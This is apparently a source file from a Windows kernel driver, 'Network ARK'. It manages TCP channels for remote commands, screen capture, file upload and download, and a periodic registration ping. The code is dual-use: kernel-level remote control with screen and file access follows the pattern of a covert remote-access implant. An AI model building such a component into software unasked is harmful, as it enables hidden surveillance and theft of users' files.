/*++
    TcpLink.c --- Kernel TCP link manager for Network ARK.

    The manager owns three physical TCP channels:
      - control: commands, registration, heartbeat, small status frames
      - screen : screen capture requests/responses
      - file   : file enumeration and upload/download chunks
--*/

#include "TcpLink.h"
#include "TcpChannel.h"
#include "NetControl.h"
#include "../Shared/Protocol.h"
#include "../Shared/ProtocolRoute.h"
#include "../Shared/NdarkLog.h"

NTSYSAPI NTSTATUS NTAPI ZwWaitForSingleObject(
    _In_ HANDLE Handle,
    _In_ BOOLEAN Alertable,
    _In_opt_ PLARGE_INTEGER Timeout);

static TCP_CHANNEL g_ControlChannel;
static TCP_CHANNEL g_ScreenChannel;
static TCP_CHANNEL g_FileChannel;
static HANDLE      g_PingThread = NULL;
static volatile LONG g_TcpStop = 0;
static KEVENT      g_TcpStopEvent;
static BOOLEAN     g_ChannelsInited = FALSE;

extern volatile LONG g_ControlStop;   /* from NetControl.c */

static VOID
TcpDispatchIncoming(_In_reads_bytes_(Len) const CHAR* Payload, _In_ ULONG Len)
{
    NetDrvDispatchCommand(Payload, Len);
}

static PTCP_CHANNEL
TcpSelectChannel(_In_ int ChannelId)
{
    switch (ChannelId) {
    case NETDRV_TCP_CHANNEL_SCREEN:
        return &g_ScreenChannel;
    case NETDRV_TCP_CHANNEL_FILE:
        return &g_FileChannel;
    case NETDRV_TCP_CHANNEL_CONTROL:
    default:
        return &g_ControlChannel;
    }
}

static VOID
TcpInitChannels(VOID)
{
    if (g_ChannelsInited)
        return;

    TcpChannelInit(&g_ControlChannel, "control", NETDRV_TCP_CONTROL_PORT,
                   TcpDispatchIncoming, TRUE);
    TcpChannelInit(&g_ScreenChannel, "screen", NETDRV_TCP_SCREEN_PORT,
                   TcpDispatchIncoming, FALSE);
    TcpChannelInit(&g_FileChannel, "file", NETDRV_TCP_FILE_PORT,
                   TcpDispatchIncoming, FALSE);
    g_ChannelsInited = TRUE;
}

static VOID
TcpPingThread(_In_opt_ PVOID Context)
{
    LARGE_INTEGER timeout;

    UNREFERENCED_PARAMETER(Context);
    timeout.QuadPart = -50000000LL;

    while (InterlockedCompareExchange(&g_TcpStop, 0, 0) == 0) {
        KeWaitForSingleObject(&g_TcpStopEvent, Executive,
                              KernelMode, FALSE, &timeout);
        if (InterlockedCompareExchange(&g_TcpStop, 0, 0) != 0)
            break;
        if (InterlockedCompareExchange(&g_ControlStop, 0, 0) != 0)
            break;
        if (TcpChannelIsConnected(&g_ControlChannel))
            TcpChannelSendString(&g_ControlChannel, NETDRV_REG_PING, TRUE);
    }

    PsTerminateSystemThread(STATUS_SUCCESS);
}

NTSTATUS
TcpLinkStart(VOID)
{
    NTSTATUS st;

    TcpInitChannels();

    if (g_PingThread)
        return STATUS_SUCCESS;

    InterlockedExchange(&g_TcpStop, 0);
    KeInitializeEvent(&g_TcpStopEvent, NotificationEvent, FALSE);

    st = TcpChannelStart(&g_ControlChannel);
    if (!NT_SUCCESS(st))
        return st;

    st = TcpChannelStart(&g_ScreenChannel);
    if (!NT_SUCCESS(st))
        return st;

    st = TcpChannelStart(&g_FileChannel);
    if (!NT_SUCCESS(st))
        return st;

    st = PsCreateSystemThread(&g_PingThread, THREAD_ALL_ACCESS,
                              NULL, NULL, NULL, TcpPingThread, NULL);
    if (!NT_SUCCESS(st))
        g_PingThread = NULL;

    NDARK_LOG_INFO("TcpLink started: control=%u screen=%u file=%u",
                   NETDRV_TCP_CONTROL_PORT, NETDRV_TCP_SCREEN_PORT,
                   NETDRV_TCP_FILE_PORT);
    return STATUS_SUCCESS;
}

VOID
TcpLinkStop(VOID)
{
    if (!g_ChannelsInited)
        return;

    InterlockedExchange(&g_TcpStop, 1);
    KeSetEvent(&g_TcpStopEvent, IO_NO_INCREMENT, FALSE);

    if (g_PingThread) {
        ZwWaitForSingleObject(g_PingThread, FALSE, NULL);
        ZwClose(g_PingThread);
        g_PingThread = NULL;
    }

    TcpChannelStop(&g_FileChannel);
    TcpChannelStop(&g_ScreenChannel);
    TcpChannelStop(&g_ControlChannel);
    NDARK_LOG_INFO("TcpLink stopped");
}

static NTSTATUS
TcpLinkSendTo(_In_ int ChannelId,
              _In_reads_bytes_(Len) const VOID* Data,
              _In_ ULONG Len,
              _In_ BOOLEAN High)
{
    PTCP_CHANNEL channel = TcpSelectChannel(ChannelId);
    NTSTATUS st = TcpChannelSend(channel, Data, Len, High);

    if (!NT_SUCCESS(st) && ChannelId != NETDRV_TCP_CHANNEL_CONTROL)
        st = TcpChannelSend(&g_ControlChannel, Data, Len, High);
    return st;
}

NTSTATUS
TcpLinkSend(_In_reads_bytes_(Len) const VOID* Data, _In_ ULONG Len)
{
    int channelId = NetDrvClassifyDriverPayload((const char*)Data, Len);
    return TcpLinkSendTo(channelId, Data, Len, FALSE);
}

NTSTATUS
TcpLinkSendHigh(_In_reads_bytes_(Len) const VOID* Data, _In_ ULONG Len)
{
    int channelId = NetDrvClassifyDriverPayload((const char*)Data, Len);
    return TcpLinkSendTo(channelId, Data, Len, TRUE);
}

NTSTATUS
TcpLinkSendString(_In_z_ const CHAR* Str)
{
    return TcpLinkSendHigh(Str, (ULONG)strlen(Str));
}

NTSTATUS
TcpLinkSendControl(_In_reads_bytes_(Len) const VOID* Data, _In_ ULONG Len)
{
    return TcpLinkSendTo(NETDRV_TCP_CHANNEL_CONTROL, Data, Len, TRUE);
}

NTSTATUS
TcpLinkSendControlString(_In_z_ const CHAR* Str)
{
    return TcpLinkSendControl(Str, (ULONG)strlen(Str));
}

NTSTATUS
TcpLinkSendScreen(_In_reads_bytes_(Len) const VOID* Data, _In_ ULONG Len)
{
    return TcpLinkSendTo(NETDRV_TCP_CHANNEL_SCREEN, Data, Len, TRUE);
}

NTSTATUS
TcpLinkSendScreenString(_In_z_ const CHAR* Str)
{
    return TcpLinkSendScreen(Str, (ULONG)strlen(Str));
}

NTSTATUS
TcpLinkSendFile(_In_reads_bytes_(Len) const VOID* Data, _In_ ULONG Len)
{
    return TcpLinkSendTo(NETDRV_TCP_CHANNEL_FILE, Data, Len, FALSE);
}

NTSTATUS
TcpLinkSendFileString(_In_z_ const CHAR* Str)
{
    return TcpLinkSendFile(Str, (ULONG)strlen(Str));
}

BOOLEAN
TcpLinkIsConnected(VOID)
{
    return TcpChannelIsConnected(&g_ControlChannel);
}

BOOLEAN
TcpLinkIsScreenConnected(VOID)
{
    return TcpChannelIsConnected(&g_ScreenChannel);
}

BOOLEAN
TcpLinkIsFileConnected(VOID)
{
    return TcpChannelIsConnected(&g_FileChannel);
}
